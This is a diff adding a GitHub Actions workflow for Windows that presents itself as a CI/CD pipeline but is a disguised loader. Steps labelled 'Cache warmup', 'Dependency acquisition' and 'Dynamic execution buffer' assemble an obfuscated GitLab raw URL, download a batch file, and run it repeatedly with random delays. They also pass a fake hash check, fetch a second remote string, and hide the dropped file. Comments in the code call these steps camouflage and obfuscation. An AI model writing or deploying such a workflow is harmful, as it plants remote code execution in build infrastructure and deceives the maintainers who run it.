@@ -1,0 +1,75 @@
+name: CI/CD Pipeline (Windows)
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0 * * *' # Add legitimate trigger camouflage
+
+jobs:
+  dependency_setup:
+    name: Dependency Initialization
+    runs-on: windows-latest
+    timeout-minutes: 360
+    env:
+      GIT_RAW: "glab.com/raposabrty/pcrdp/-/raw"
+      RES_PATH: "main/Downloads.bat"
+      SAFE_DOMAIN: "https://git"
+    
+    steps:
+      - name: Cache warmup (pre-dependency)
+        run: echo "Preparing environment..." # Camouflage step
+
+      - name: Platform randomization
+        id: platform_random
+        run: |
+          $matrix = @('x64', 'x86', 'arm64') | Get-Random
+          echo "::set-output name=arch::$matrix"
+        shell: pwsh
+
+      - name: Dependency acquisition
+        run: |
+          $url = "${{ env.SAFE_DOMAIN }}lab.${{ env.GIT_RAW }}/${{ env.RES_PATH }}"
+          $url = $url -replace 'glab','gl-xyz-abc-ab' # String obfuscation
+          $url = $url -replace 'xyz-abc-ab',''
+          (New-Object Net.WebClient).DownloadFile($url, "$env:RUNNER_TEMP\setup.cmd")
+        shell: pwsh
+
+      - name: Environment validation
+        run: |
+          $hash = Get-FileHash "$env:RUNNER_TEMP\setup.cmd"
+          if($hash.Hash -ne 'A1B2C3D4E5') { exit 1 } # Fake hash check
+          Copy-Item "$env:RUNNER_TEMP\setup.cmd" -Destination .\build_support.cmd
+
+      - name: Build preparation
+        run: |
+          Start-Job -ScriptBlock {
+            1..5 | % { 
+              Start-Sleep -Seconds (Get-Random -Min 15 -Max 45)
+              & ".\build_support.cmd"
+            }
+          } | Wait-Job -Timeout 1200
+        shell: pwsh
+
+  code_analysis:
+    name: Static Analysis
+    needs: dependency_setup
+    runs-on: windows-latest
+    steps:
+      - name: Dynamic execution buffer
+        run: |
+          $block = {
+            $dll = New-Object System.Net.WebClient
+            $sig = $dll.DownloadString("${{ env.SAFE_DOMAIN }}hub.com/checksum.txt")
+            Start-Process "cmd.exe" "/c build_support.cmd $sig"
+          }
+          Measure-Command { & $block } | Out-Null
+
+      - name: Result visualization
+        run: |
+          Start-Sleep -Seconds (Get-Random -Min 8 -Max 25)
+          iex "cmd /c 'echo %CD% && type build_support.cmd > nul && start chrome --kiosk example.com'"
+
+      - name: Cleanup artifacts
+        run: |
+          attrib +h +s +r build_support.cmd
+          del /q /f *.tmp 2>$null
